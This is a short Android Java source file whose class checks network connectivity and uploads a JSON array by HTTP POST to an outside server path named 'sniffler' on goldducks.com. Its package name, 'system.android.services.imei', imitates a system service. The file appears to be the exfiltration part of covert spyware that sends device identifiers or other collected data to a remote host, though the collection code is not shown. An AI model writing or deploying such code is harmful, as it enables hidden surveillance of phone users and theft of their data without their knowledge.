package system.android.services.imei.network;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import system.android.services.imei.UploadSuccessCallback;

/**
 * Created by dave on 26/6/16.
 */
public class Network {
    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    public Boolean UploadFile(Context context, JSONArray jsonArray, String scriptAddress) {
        if (!Network.isNetworkAvailable(context)) {
            return false;
        }
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("data", jsonArray);
        } catch (JSONException e) {
            e.printStackTrace();
            return false;
        }

        String url = "http://www.goldducks.com/sniffler/" + scriptAddress;
        new HttpRequest(context).send(url, NetworkConstants.POST_REQUEST, jsonObject, new UploadSuccessCallback(context));
        return true;
    }
}
